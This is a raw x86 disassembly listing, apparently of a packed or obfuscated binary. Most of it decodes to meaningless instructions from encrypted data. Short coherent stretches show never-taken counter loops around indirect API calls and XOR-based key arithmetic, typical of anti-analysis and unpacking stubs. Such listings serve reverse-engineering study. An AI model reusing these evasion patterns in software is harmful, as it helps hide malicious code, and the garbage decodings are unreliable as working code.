  402905:	and    BYTE PTR [edx-0x4b8736e8],0x50
  40290c:	mov    ds:0x1e4f1618,eax
  402911:	jl     0x402960
  402913:	or     dh,BYTE PTR [edx]
  402915:	in     eax,0x5a
  402917:	sbb    ah,BYTE PTR [ebp-0xd4a8b55]
  40291d:	and    al,0x7a
  40291f:	fnsave [edx]
  402921:	and    DWORD PTR [eax],esi
  402923:	sbb    al,0xc5
  402925:	xchg   ebx,eax
  402926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402927:	je     0x402974
  402929:	dec    ecx
  40292a:	pusha  
  40292b:	ss nop
  40292d:	mov    edi,0x1bfc93ce
  402932:	ja     0x40299a
  402934:	cdq    
  402935:	add    DWORD PTR [edi+0x5b],esp
  402938:	popa   
  402939:	jae    0x402962
  40293b:	push   cs
  40293c:	jmp    0x68d165aa
  402941:	mov    ch,0x42
  402943:	pop    es
  402944:	fisubr WORD PTR [esi+0xdd62f84]
  40294a:	mov    bl,0x5e
  40294c:	inc    eax
  40294d:	push   eax
  40294e:	out    0x44,eax
  402950:	and    eax,0x5cb9617f
  402955:	outs   dx,BYTE PTR ds:[esi]
  402956:	ret    0x5037
  402959:	retf   0xcfba
  40295c:	sbb    eax,0xf82b21a
  402961:	scas   eax,DWORD PTR es:[edi]
  402962:	lods   al,BYTE PTR ds:[esi]
  402963:	sub    ch,BYTE PTR [eax+eax*8+0x60]
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fd5d
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e76f
  402988:	sbb    DWORD PTR ds:0x42e793,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fd69,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fd69,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fd69,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e1ac
  4029bc:	push   0x42e783
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e4cf
  4029cc:	mov    edx,DWORD PTR ds:0x42fd69
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fd69,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e77f,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e77f,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e77f,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e353
  402a0d:	cmp    DWORD PTR ds:0x42e77f,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e77f
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e77f,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e77f
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e77f,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fe2e
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fd55,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd8d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e1a8,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e1a8,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e1a8
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e1a8,edi
  402a94:	cmp    DWORD PTR ds:0x42e1a8,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e1a8,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e1c1
  402ab3:	call   DWORD PTR ds:0x42e4d3
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x6a03a6d0
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x1d70707e
  402afd:	mov    WORD PTR [ecx-0x46],gs
  402b00:	pop    esp
  402b01:	jno    0x402b69
  402b03:	call   0x67cd:0x7ad58779
  402b0a:	in     eax,0xcf
  402b0c:	inc    edi
  402b0d:	add    BYTE PTR [edi+0x2b],ch
  402b10:	test   BYTE PTR [edx+0x474a92f0],ch
  402b16:	(bad)  
  402b17:	xchg   edi,eax
  402b18:	lods   al,BYTE PTR ds:[esi]
  402b19:	pop    esp
  402b1a:	adc    bl,BYTE PTR [edi]
  402b1c:	xor    edx,DWORD PTR [edi-0x548618eb]
  402b22:	xchg   edx,eax
  402b23:	ins    DWORD PTR es:[edi],dx
  402b24:	lods   al,BYTE PTR ds:[esi]
  402b25:	jmp    0x25f87dec
  402b2a:	and    eax,0x9529c293
  402b2f:	das    
  402b30:	cmp    ah,0x32
  402b33:	pop    edi
  402b34:	sbb    bh,bl
  402b36:	and    esp,DWORD PTR [edx+0x32]
  402b39:	mov    cl,0x2f
  402b3b:	push   esp
  402b3c:	dec    ebp
  402b3d:	in     al,0x1
  402b3f:	stos   DWORD PTR es:[edi],eax
  402b40:	les    esi,FWORD PTR [eax+0x4e863284]
  402b46:	inc    ebx
  402b47:	lods   eax,DWORD PTR ds:[esi]
  402b48:	rcl    dh,1
  402b4a:	into   
  402b4b:	es xor eax,0xa7686b76
  402b51:	xor    DWORD PTR [ebx+0x7a61b388],ecx
  402b57:	sbb    DWORD PTR [esi],0x3ff63891
  402b5d:	mov    ecx,0x4713d2cd
  402b62:	outs   dx,DWORD PTR ds:[esi]
  402b63:	sti    
  402b64:	call   0x26d7e1d3
  402b69:	jecxz  0x402b6f
  402b6b:	stos   BYTE PTR es:[edi],al
  402b6c:	mov    ecx,0x4cf09597
  402b71:	test   eax,0x98720817
  402b76:	mov    dl,0xa
  402b78:	xchg   esp,eax
  402b79:	or     bl,BYTE PTR [esi]
  402b7b:	and    eax,0x340243d8
  402b80:	inc    ecx
  402b81:	xchg   edx,eax
  402b82:	jbe    0x402b0e
  402b84:	into   
  402b85:	dec    edi
  402b86:	lss    edi,FWORD PTR [eax]
  402b89:	call   0x6f0d312
  402b8e:	pop    esp
  402b8f:	shr    eax,0xfd
  402b92:	pop    ebx
  402b93:	in     eax,dx
  402b94:	retf   0x8f27
  402b97:	xor    eax,0xaa4ce150
  402b9c:	in     eax,0xf2
  402b9e:	pop    ecx
  402b9f:	imul   ebp,esi,0x54ce3f55
  402ba5:	push   ds
  402ba6:	push   ebx
  402ba7:	outs   dx,DWORD PTR ds:[esi]
  402ba8:	cli    
  402ba9:	cmc    
  402baa:	xchg   DWORD PTR [eax+0x21bacdbc],ebp
  402bb0:	jp     0x402b98
  402bb2:	inc    eax
  402bb3:	cli    
  402bb4:	add    ch,BYTE PTR [eax-0x3b]
  402bb7:	adc    ecx,DWORD PTR [ecx+0x18]
  402bba:	mov    bh,0xfb
  402bbc:	scas   eax,DWORD PTR es:[edi]
  402bbd:	jmp    0xf260:0x6679f9ca
  402bc4:	mov    ah,0x23
  402bc6:	jnp    0x402bde
  402bc8:	push   esi
  402bc9:	push   eax
  402bca:	pushf  
  402bcb:	call   0xaf4c:0xf35ae783
  402bd2:	add    BYTE PTR [ecx+0x5e68e6b9],ah
  402bd8:	pusha  
  402bd9:	jno    0x402c38
  402bdb:	mov    ch,0xb2
  402bdd:	int3   
  402bde:	fst    DWORD PTR [esi]
  402be0:	das    
  402be1:	sub    DWORD PTR [esi*1+0x7114458d],ebp
  402be8:	scas   eax,DWORD PTR es:[edi]
  402be9:	inc    ebp
  402bea:	retf   0xc5f
  402bed:	pop    es
  402bee:	lahf   
  402bef:	cdq    
  402bf0:	fldenv [esi]
  402bf2:	mov    cl,BYTE PTR [ecx]
  402bf4:	repnz rcl DWORD PTR [ecx],cl
  402bf7:	mov    eax,0x65c3400b
  402bfc:	add    eax,0x63d2a08c
  402c01:	jo     0x402b84
  402c03:	popa   
  402c04:	call   FWORD PTR [eax+edi*1]
  402c07:	call   0x662ba79d
  402c0c:	jl     0x402bf8
  402c0e:	mov    edx,0x36db10ba
  402c13:	jecxz  0x402ba4
  402c15:	xchg   ebx,eax
  402c16:	pop    ds
  402c17:	or     ah,0x55
  402c1a:	ins    DWORD PTR es:[edi],dx
  402c1b:	popf   
  402c1c:	or     al,0x72
  402c1e:	dec    eax
  402c1f:	mov    BYTE PTR [ecx],ch
  402c21:	cli    
  402c22:	in     eax,0xe2
  402c24:	jp     0x402c9c
  402c26:	fldenv [eax-0x2a]
  402c29:	(bad)  
  402c2a:	jne    0x402c25
  402c2c:	inc    eax
  402c2d:	jmp    0x402c01
  402c2f:	pop    ds
  402c30:	jne    0x402c3f
  402c32:	cli    
  402c33:	jle    0x402c58
  402c35:	jo     0x402c21
  402c37:	mov    DWORD PTR [ecx+0x10],edi
  402c3a:	out    0x80,al
  402c3c:	call   0x337af6fe
  402c41:	ds jbe 0x402c84
  402c44:	or     eax,0x5aef72b0
  402c49:	adc    bh,BYTE PTR [esi-0x34ca0281]
  402c4f:	xlat   BYTE PTR ds:[ebx]
  402c50:	xchg   ebp,eax
  402c51:	sub    eax,0x2a00ecb
  402c56:	retf   0x60d4
  402c59:	pop    eax
  402c5a:	xchg   DWORD PTR [esi-0x55c3f8ee],ebp
  402c60:	mov    dl,0x36
  402c62:	mov    edx,0xdb3be455
  402c67:	lds    esi,FWORD PTR [edx+0x78b98404]
  402c6d:	enter  0x6bed,0xa5
  402c71:	sub    al,cl
  402c73:	rcr    BYTE PTR [eax+0x4e021ed8],0x4d
  402c7a:	lods   al,BYTE PTR ds:[esi]
  402c7b:	and    esp,0x432cbe68
  402c81:	inc    edi
  402c82:	xor    ebp,DWORD PTR [ecx-0x54]
  402c85:	es out dx,al
  402c87:	hlt    
  402c88:	push   edx
  402c89:	xchg   ch,bl
  402c8b:	fimul  DWORD PTR [ebp+0x5d]
  402c8e:	sbb    bl,al
  402c90:	je     0x402cef
  402c92:	rcr    DWORD PTR ds:0x7ceac962,0xe5
  402c99:	pop    ecx
  402c9a:	or     BYTE PTR [eax+ecx*8],bh
  402c9d:	pop    eax
  402c9e:	xor    BYTE PTR [ebp-0x5667520a],dh
  402ca4:	or     ecx,eax
  402ca6:	in     al,0xca
  402ca8:	arpl   WORD PTR [ebp+0x13aee0de],cx
  402cae:	and    edx,DWORD PTR [ebx-0x17]
  402cb1:	int3   
  402cb2:	add    eax,DWORD PTR [ebx*2-0x7a4ce097]
  402cb9:	test   eax,0xa58c21c9
  402cbe:	sahf   
  402cbf:	jecxz  0x402cbc
  402cc1:	inc    esp
  402cc2:	xor    DWORD PTR ds:0x10d7e45a,edi
  402cc8:	add    BYTE PTR [ebx],bl
  402cca:	fwait
  402ccb:	mov    edi,0x1ff5546a
  402cd0:	mov    DWORD PTR [ecx-0x78],esi
  402cd3:	xchg   dh,ah
  402cd5:	in     eax,dx
  402cd6:	xor    ebx,DWORD PTR [esp+eax*4]
  402cd9:	sahf   
  402cda:	imul   esi,DWORD PTR [edi-0x69],0x76
  402cde:	clc    
  402cdf:	adc    eax,0x3441e01d
  402ce4:	or     bh,BYTE PTR [esi+0xc]
  402ce7:	repz mov al,bl
  402cea:	mov    dl,0x2a
  402cec:	or     eax,0x9721004a
  402cf1:	(bad)  
  402cf2:	lahf   
  402cf3:	sub    BYTE PTR [ecx-0x5c],0xd3
  402cf7:	inc    ecx
  402cf8:	mov    ch,0xcc
  402cfa:	pushw  0x2a2f
  402cfe:	fs int3 
  402d00:	int    0x13
  402d02:	add    BYTE PTR [edi+0x46],0x9e
  402d06:	icebp  
  402d07:	jmp    0x2703:0x345e4ab3
  402d0e:	rcl    BYTE PTR [ebx+0x17],1
  402d11:	cs push edi
  402d13:	mov    ds:0x4cd7d49a,eax
  402d18:	out    dx,eax
  402d19:	xor    al,0x73
  402d1b:	adc    dl,0xd9
  402d1e:	je     0x402cf4
  402d20:	lds    eax,FWORD PTR [edx+0x65]
  402d23:	push   esp
  402d24:	xor    al,BYTE PTR [edx]
  402d26:	or     ebp,DWORD PTR [edx]
  402d28:	stos   BYTE PTR es:[edi],al
  402d29:	and    ah,BYTE PTR [esi-0xd]
  402d2c:	mov    ebx,0xd2bc3a40
  402d31:	mov    esi,0xea809d4c
  402d36:	test   al,0xa1
  402d38:	xchg   BYTE PTR [esi-0x28ec1bc8],ah
  402d3e:	push   es
  402d3f:	mov    ?,WORD PTR [edi]
  402d41:	mov    al,ds:0xca57c617
  402d46:	dec    esi
  402d47:	addr16 pop esi
  402d49:	fisttp WORD PTR [ebx+0x49]
  402d4c:	imul   ebx,DWORD PTR [ebp+esi*2+0x3a],0x56c4ee3a
  402d54:	jg     0x402dc8
  402d56:	dec    edi
  402d57:	lods   al,BYTE PTR ds:[esi]
  402d58:	or     al,0xcd
  402d5a:	and    bh,BYTE PTR [ebx]
  402d5c:	mov    bl,0xb0
  402d5e:	cmp    bh,dh
  402d60:	push   ebp
  402d61:	stos   DWORD PTR es:[edi],eax
  402d62:	cli    
  402d63:	out    dx,al
  402d64:	xor    BYTE PTR [esi-0xf],al
  402d67:	jge    0x402cfe
  402d69:	push   esp
  402d6a:	and    bh,BYTE PTR [eax]
  402d6c:	dec    esi
  402d6d:	mov    esi,0x54e1c173
  402d72:	arpl   sp,di
  402d74:	cmp    bl,ch
  402d76:	push   edx
  402d77:	ret    0x7bce
  402d7a:	xchg   ebx,eax
  402d7b:	rol    dl,1
  402d7d:	mov    ah,0xa8
  402d7f:	fstp   DWORD PTR [esi]
  402d81:	push   0xffffffdb
  402d83:	jb     0x402dc4
  402d85:	mov    edi,0x7019832d
  402d8a:	xchg   DWORD PTR [edi+0x11],esi
  402d8d:	inc    ecx
  402d8e:	lahf   
  402d8f:	mov    cl,0x3e
  402d91:	scas   al,BYTE PTR es:[edi]
  402d92:	stos   DWORD PTR es:[edi],eax
  402d93:	dec    edi
  402d94:	push   0x70
  402d96:	addr16 out dx,eax
  402d98:	add    bl,BYTE PTR [eax-0x14]
  402d9b:	xlat   BYTE PTR ds:[ebx]
  402d9c:	pop    edi
  402d9d:	jecxz  0x402e0f
  402d9f:	sar    BYTE PTR [ecx+0x48022f78],0xfd
  402da6:	sub    ah,dl
  402da8:	push   ebp
  402da9:	xor    eax,0x7d1f3551
  402dae:	inc    ebx
  402daf:	pop    edi
  402db0:	les    edi,FWORD PTR [edi+0x23bac68c]
  402db6:	fisttp WORD PTR [ecx+0x25]
  402db9:	inc    esi
  402dba:	lea    esi,ss:[eax+ebx*2]
  402dbe:	add    edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	enter  0x54e5,0xdc
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e69
  402dec:	je     0x402e1c
  402dee:	cmp    bh,BYTE PTR [eax-0x1a60b50]
  402df4:	addr16 gs cdq 
  402df7:	or     eax,0x81c063a8
  402dfc:	lods   al,BYTE PTR ds:[esi]
  402dfd:	add    al,0xbf
  402dff:	pushf  
  402e00:	(bad)  
  402e01:	and    ebp,edx
  402e03:	out    0x16,eax
  402e05:	xor    eax,0x41209eef
  402e0a:	or     BYTE PTR [eax],bh
  402e0c:	adc    edx,edx
  402e0e:	push   ecx
  402e0f:	imul   eax,DWORD PTR [eax+0x68],0xffffff96
  402e13:	test   BYTE PTR [edx+0x58117dd],ah
  402e19:	daa    
  402e1a:	push   esp
  402e1b:	jmp    0x92f0:0x84e0d882
  402e22:	clc    
  402e23:	inc    esi
  402e24:	xor    BYTE PTR [ecx-0x7e],0x58
  402e28:	or     edi,0x5e
  402e2b:	pop    eax
  402e2c:	sbb    BYTE PTR [esi+ecx*2+0x52],al
  402e30:	sahf   
  402e31:	rol    DWORD PTR [eax-0x61],1
  402e34:	(bad)  
  402e35:	in     al,dx
  402e36:	fs mov ecx,0x4c58daa6
  402e3c:	lds    esi,FWORD PTR [eax+0x57]
  402e3f:	adc    edx,ecx
  402e41:	rcl    BYTE PTR [ebx-0x7dc1c0dd],1
  402e47:	push   es
  402e48:	inc    ecx
  402e49:	jbe    0x402e95
  402e4b:	xchg   BYTE PTR [eax+0x4d1c1209],bl
  402e51:	leave  
  402e52:	in     al,dx
  402e53:	xor    al,0x2e
  402e55:	or     esp,DWORD PTR [ebp+0x1a9db757]
  402e5b:	push   esi
  402e5c:	sbb    al,0xf6
  402e5e:	sbb    eax,0xd3dee806
  402e63:	push   esi
  402e64:	push   ebx
  402e65:	loopne 0x402e70
  402e67:	cs inc ecx
  402e69:	add    eax,0x1dafd9e7
  402e6e:	xchg   edx,eax
  402e6f:	push   esp
  402e70:	push   0x5
  402e72:	pusha  
  402e73:	in     eax,dx
  402e74:	out    0x12,al
  402e76:	xchg   edx,eax
  402e77:	retf   0xe267
  402e7a:	push   ds
  402e7b:	fucom  st(2)
  402e7d:	lea    edx,ds:0xa0fa1442
  402e83:	lea    esi,gs:[eax+0x62db9f58]
  402e8a:	imul   ecx,DWORD PTR [ebx-0x4c],0x118e0b48
  402e91:	cmp    eax,0x453ce419
  402e96:	hlt    
  402e97:	mov    al,0x4c
  402e99:	xchg   esi,eax
  402e9a:	or     dl,BYTE PTR [edx+0x48]
  402e9d:	jge    0x402ef0
  402e9f:	jg     0x402ef3
  402ea1:	or     al,0x3b
  402ea3:	ror    bh,0x6d
  402ea6:	adc    al,0x25
  402ea8:	add    eax,0xdd52e509
  402ead:	mov    BYTE PTR [edx+0x4a9e714f],ah
  402eb3:	retf   0x8f81
  402eb6:	jbe    0x402ef5
  402eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eb9:	fwait
  402eba:	mov    edi,0xa30f53fe
  402ebf:	js     0x402ef7
  402ec1:	out    dx,al
  402ec2:	add    cl,BYTE PTR [ecx]
  402ec4:	push   0xdd2b4eba
  402ec9:	jmp    0xd98d51ea
  402ece:	inc    ebp
  402ecf:	pop    es
  402ed0:	fisttp WORD PTR [eax+0x2]
  402ed3:	into   
  402ed4:	xchg   edx,eax
  402ed5:	xchg   BYTE PTR [edx-0x23ca422c],bl
  402edb:	mov    bh,0x77
  402edd:	jae    0x402f25
  402edf:	test   DWORD PTR [edx+0x7f],0xc0ee324f
  402ee6:	clc    
  402ee7:	mov    ds:0x515e801d,eax
  402eec:	xor    ebx,DWORD PTR ds:0x253e3054
  402ef2:	jmp    0x5ede:0x6a2ff6b6
  402ef9:	call   0x2561:0x912c467f
  402f00:	and    esi,DWORD PTR [eax]
  402f02:	inc    ebx
  402f03:	jle    0x402f19
  402f05:	(bad)  
  402f06:	in     al,0xbe
  402f08:	fwait
  402f09:	cmp    eax,DWORD PTR [ebp-0x21]
  402f0c:	pop    eax
  402f0d:	addr16 sahf 
  402f0f:	pop    ecx
  402f10:	jnp    0x402f28
  402f12:	dec    ebx
  402f13:	sahf   
  402f14:	sub    ch,dh
  402f16:	push   es
  402f17:	push   ds
  402f18:	popa   
  402f19:	js     0x402f17
  402f1b:	arpl   WORD PTR [ebp-0x7a4d2b7b],sp
  402f21:	in     al,dx
  402f22:	lahf   
  402f23:	xchg   esp,eax
  402f24:	push   edi
  402f25:	retf   0xee8f
  402f28:	sbb    al,BYTE PTR [ebx-0x151816d8]
  402f2e:	je     0x402ee5
  402f30:	mov    esp,DWORD PTR ds:0x7dfe5d11
  402f36:	lods   eax,DWORD PTR ds:[esi]
  402f37:	jb     0x402ecb
  402f39:	fwait
  402f3a:	dec    ebp
  402f3b:	(bad)  [esi-0x3eed10a9]
  402f41:	les    edi,FWORD PTR [ecx+0x70]
  402f44:	addr16 cmp eax,0xb073a2ab
  402f4a:	mov    esp,0xa4d6f2ee
  402f4f:	lods   eax,DWORD PTR ds:[esi]
  402f50:	std    
  402f51:	inc    ecx
  402f52:	loope  0x402f15
  402f54:	xchg   DWORD PTR [ecx],esp
  402f56:	push   ds
  402f57:	sahf   
  402f58:	push   ebp
  402f59:	cmp    BYTE PTR [ebp+0x4c],al
  402f5c:	sub    DWORD PTR [edi+0xe],0xcbbbf100
  402f63:	sub    edx,ecx
  402f65:	stc    
  402f66:	loopne 0x402f9c
  402f68:	sbb    cl,cl
  402f6a:	into   
  402f6b:	repz (bad) 
  402f6d:	push   ds
  402f6e:	call   0x7246be91
  402f73:	xchg   edi,eax
  402f74:	fmul   DWORD PTR [eax-0x7]
  402f77:	popa   
  402f78:	inc    edx
  402f79:	add    DWORD PTR [edi+0x15],ebp
  402f7c:	mov    ds:0x8164aa17,al
  402f81:	mov    ebp,DWORD PTR [edi-0x3e369811]
  402f87:	aad    0x73
  402f89:	bound  ebx,QWORD PTR [edx]
  402f8b:	(bad)  
  402f8d:	inc    ecx
  402f8e:	cld    
  402f8f:	push   0xef6379b2
  402f94:	pop    ebx
  402f95:	repnz cs pop edx
  402f98:	sbb    DWORD PTR [edi+0x4efcaaec],ebx
  402f9e:	(bad)  
  402f9f:	rol    BYTE PTR [ebx-0x6b],1
  402fa2:	xchg   esp,eax
  402fa3:	addr16 cwde 
  402fa5:	retf   
  402fa6:	rcr    ch,1
  402fa8:	shl    DWORD PTR [eax-0x21c333cc],1
  402fae:	mov    dl,0xc1
  402fb0:	push   ebx
  402fb1:	xchg   DWORD PTR [ebp-0x6f51606f],edi
  402fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fb8:	dec    ebx
  402fb9:	inc    eax
  402fba:	add    BYTE PTR [ecx+0x7326d23a],dh
  402fc0:	lea    edx,[eax-0x8]
  402fc3:	cdq    
  402fc4:	imul   eax,ebx,0xffffffb8
  402fc7:	mov    dh,BYTE PTR [ecx-0x3b90fd98]
  402fcd:	imul   edi,DWORD PTR [eax-0x2026401a],0x64
  402fd4:	sub    al,0xeb
  402fd6:	es loop 0x403057
  402fd9:	icebp  
  402fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fdb:	outs   dx,BYTE PTR ds:[esi]
  402fdc:	daa    
  402fdd:	jbe    0x40302e
  402fdf:	sub    al,0x49
  402fe1:	sub    al,0xa
  402fe3:	xor    dh,BYTE PTR [ebp+0x56]
  402fe6:	loopne 0x402f70
  402fe8:	xor    eax,0xe5fe8c6c
  402fed:	test   BYTE PTR [esi+0x75],ch
  402ff0:	dec    esp
  402ff1:	iret   
  402ff2:	cwde   
  402ff3:	scas   al,BYTE PTR es:[edi]
  402ff4:	jl     0x403050
  402ff6:	out    0xd,eax
  402ff8:	and    bh,dl
  402ffa:	dec    esi
  402ffb:	stos   BYTE PTR es:[edi],al
  402ffc:	mov    ah,0xb9
  402ffe:	in     al,0x96
  403000:	lock fs or esi,ebp
  403004:	out    0xe0,eax
  403006:	jns    0x403046
  403008:	dec    ebx
  403009:	sub    esp,0xffffffea
  40300c:	cdq    
  40300d:	sub    eax,0xeb0480df
  403012:	mov    cl,0x7
  403014:	ja     0x40300a
  403016:	inc    esp
  403017:	push   edx
  403018:	popa   
  403019:	push   esp
  40301a:	mov    DWORD PTR [esi-0x64f5f981],eax
  403020:	sbb    cl,BYTE PTR [esi]
  403022:	or     al,0x44
  403024:	call   0x9ebf7c3a
  403029:	lahf   
  40302a:	cld    
  40302b:	aam    0xe1
  40302d:	xlat   BYTE PTR ds:[ebx]
  40302e:	cld    
  40302f:	mov    esi,eax
  403031:	(bad)  
  403032:	xlat   BYTE PTR ds:[ebx]
  403033:	dec    ebp
  403034:	rcl    bh,0xd2
  403037:	or     eax,0x89ab4fcd
  40303c:	(bad)  
  40303d:	imul   esp,DWORD PTR [ebp+0x17],0xffffff97
  403041:	xor    BYTE PTR [ecx],bh
  403043:	mov    edi,DWORD PTR [ebx+edx*4-0x27c8bbf6]
  40304a:	mov    edx,0xd1934151
  40304f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403050:	cmc    
  403051:	fiadd  WORD PTR [edx+edx*4]
  403054:	jno    0x403099
  403056:	mov    esi,0x7d4eec02
  40305b:	in     eax,0xef
  40305d:	jo     0x40304c
  40305f:	push   edx
  403060:	mov    dh,0xf8
  403062:	aaa    
  403063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403064:	sbb    BYTE PTR [ebx],dl
  403066:	cli    
  403067:	xor    DWORD PTR [edx+0x8e6564a],ebx
  40306d:	and    al,0xaa
  40306f:	mov    al,bh
  403071:	xchg   ebx,eax
  403072:	push   0xffffff96
  403074:	sbb    bh,BYTE PTR ds:0xe00fd9e1
  40307a:	ins    DWORD PTR es:[edi],dx
  40307b:	outs   dx,DWORD PTR ds:[esi]
  40307c:	in     al,dx
  40307d:	mov    cl,0x64
  40307f:	xchg   ebp,eax
  403080:	xor    BYTE PTR [esi],ah
  403082:	sub    eax,0xa7661789
  403087:	loopne 0x4030b4
  403089:	into   
  40308a:	add    DWORD PTR [eax-0x1a],esp
  40308d:	popf   
  40308e:	loopne 0x403020
  403090:	xor    ecx,DWORD PTR [ebx]
  403092:	adc    DWORD PTR [ecx-0x2b],edx
  403095:	fisttp DWORD PTR [ecx+0x3f72fd56]
  40309b:	mov    esp,0x936c0cb7
  4030a0:	sub    al,0xcd
  4030a2:	and    DWORD PTR [eax+0x715be7c6],0xc049aa42
  4030ac:	push   cs
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x7a
  4030ce:	mov    ebx,es
  4030d0:	cs cld 
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xd270707e
  4030da:	loopne 0x403129
  4030dc:	jmp    DWORD PTR [ebx]
  4030de:	nop
  4030df:	call   0xea9:0x95d32ae0
  4030e6:	popf   
  4030e7:	ret    
  4030e8:	fwait
  4030e9:	push   0x70
  4030eb:	push   edx
  4030ec:	add    al,0x99
  4030ee:	inc    ebx
  4030ef:	fwait
  4030f0:	sub    al,0xb0
  4030f2:	dec    eax
  4030f3:	imul   DWORD PTR [ebx+0x43]
  4030f6:	stos   BYTE PTR es:[edi],al
  4030f7:	mov    ebx,0xabbfd19f
  4030fc:	mov    eax,ds:0xcfbd0e89
  403101:	jge    0x40308d
  403103:	clc    
  403104:	xchg   esp,eax
  403105:	shl    BYTE PTR [eax],0x56
  403108:	lods   eax,DWORD PTR ds:[esi]
  403109:	imul   BYTE PTR [ebp-0x23]
  40310c:	inc    edi
  40310d:	inc    ecx
  40310e:	jmp    0xb7df:0x89cc940f
  403115:	mov    esp,DWORD PTR [edx]
  403117:	cld    
  403118:	cmp    esi,DWORD PTR [esi]
  40311a:	bound  ebp,QWORD PTR [ebx+eiz*8]
  40311d:	adc    esp,eax
  40311f:	cmp    dl,cl
  403121:	dec    esp
  403122:	test   BYTE PTR [esi],0x20
  403125:	ins    DWORD PTR es:[edi],dx
  403126:	sahf   
  403127:	mov    dh,0x41
  403129:	pop    ebp
  40312a:	pop    edx
  40312b:	int3   
  40312c:	pop    ebx
  40312d:	mov    fs,WORD PTR [edi]
  40312f:	sbb    DWORD PTR [ebp-0x32a1fd19],ecx
  403135:	and    al,0x57
  403137:	rol    DWORD PTR [esi-0x3ba8c244],cl
  40313d:	in     al,dx
  40313e:	add    ebx,DWORD PTR [eax-0x63]
  403141:	stos   DWORD PTR es:[edi],eax
  403142:	push   0x72
  403144:	adc    eax,0xd6cd93a3
  403149:	repz pop ecx
  40314b:	xor    bh,BYTE PTR [edi]
  40314d:	push   ds
  40314e:	xchg   ecx,eax
  40314f:	ret    
  403150:	ds dec esp
  403152:	outs   dx,DWORD PTR ds:[esi]
  403153:	retf   0x3fba
  403156:	mov    dl,0xca
  403158:	inc    edx
  403159:	push   0x6f629f0b
  40315e:	imul   esi,DWORD PTR [eax],0x42
  403161:	pop    esp
  403162:	cmp    dh,BYTE PTR [ecx-0x4d]
  403165:	mov    ds:0xd4c3dfbd,eax
  40316a:	xchg   ebx,eax
  40316b:	mov    eax,ds:0x8412c213
  403170:	aas    
  403171:	dec    edx
